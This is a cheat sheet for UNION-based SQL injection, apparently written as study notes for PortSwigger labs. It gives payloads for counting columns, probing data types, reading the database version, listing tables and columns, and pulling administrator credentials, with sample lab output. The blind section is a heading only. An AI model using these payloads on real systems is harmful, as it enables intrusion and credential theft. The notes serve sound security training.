# SQL-Scripts

Portswigger lab exploit scripts.



Background Union:

table1    table2
a | b      c | d
1 , 2      2 , 3
3 , 4      4 , 5

Query #1: select a,b from table1
               1 , 2
               3 , 4
                
Query #2: select a,b from table1 UNION select c,d from table2
               1 , 2
               3 , 4
               2 , 3
               4 , 5
             
Rule:
  - Num and order of column must be same in all queries
  - Same data types.
  
Oracle 	    --comment

Microsoft  --comment
           /*comment*/

PostgreSQL --comment
           /*comment*/

MySQL 	#comment
        -- comment [Note the space after the double dash]
        /*comment*/

********** ERROR BASED **********

***** STEP #1: Determine # of columns *****

 Way #1: UNION
     
      select ? from table1 UNION select NULL, NULL--
       --> error: incorrecet number of columns.
       
      select ? from table1 UNION select NULL, NULL, NULL--
       --> 200 ok: correct number of columns.
       
 Way #2: ORDER BY
 
        select a,b from table1 order by 2-- 
                               order by 2#
        
***** STEP #2: Determine data type of column *****

        select a, b, c from table1 UNION select 'a', NULL, NULL--
        select a, b, c from table1 UNION select NULL, 'a', NULL--
        select a, b, c from table1 UNION select NULL, NULL, 'a'--
         --> error: column is not type text
         --> no error: column is type text.

        for oracle: 'union select 'a', 'a' from dual -- 


***** STEP #3: Finding database version *****

     oracle: select banner from v$version
             select version from v$instance

     mysql and microsoft: select @@version

     postgresql: select version()

        for oracle: ' union select banner, null from v$version--
        for mysql and microsoft: 'UNION select @@version,'a'%23


***** STEP #3: Finding username and password *****

        union select username, password from users--

       ** if only one field works concatenate string based on database

         union select null, username || password from users --  > postgresql and oracle
          "     "       " , username + password from users -- > microsoft
          "      "      " , username  password from users -- > mysql
                             concat(username,password)

      Found username and password: Gifts' union select null, username || '~' || password from users--
            administrator~z5wp402vuidu2y59oaai


***** STEP #4: Finding Database Content *****

        oracle:	SELECT * FROM all_tables
                SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE' 

        non-oracle: SELECT * FROM information_schema.tables
                    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

        1) * is a place holder for tables NAME. search For information_schema.tables on google to get table names  #(users_table)

               non-oracle:  'union select table_name, null from information_schema.tables --
               oracle: ' union select table_name,null from all_tables--
        
        2) It contains lists of database name. lets pick users_acinmi for non-oracle and users_roomix for oracle then  #(username_column,password_column)
              non-oracle: ' UNION SELECT column_name, null from information_schema.columns WHERE table_name = 'users_acinmi' --
                                     output: username_wuiqfp
                                             password_fhdiit 

                oracle: ' union select column_name,null from all_tab_columns where table_name='USERS_ROOIMX'--
                                     output: USERNAME_ICWHMD
                                             PASSWORD_DETRFJ                                 
 

        3) Output the username and password  #(administrator_table)

                non-oracle: ' UNION select username_wuiqfp, password_fhdiit from users_acinmi--
                                    output: administrator
	                                    9ro90x5y3ztmsv21nwm0

                oracle: ' union select USERNAME_ICWHMD,PASSWORD_DETRFJ from USERS_ROOIMX--
                                     output: administrator
	                                     x7e2jmfnqacfb1bxe3m0



********** BLIND SQL **********
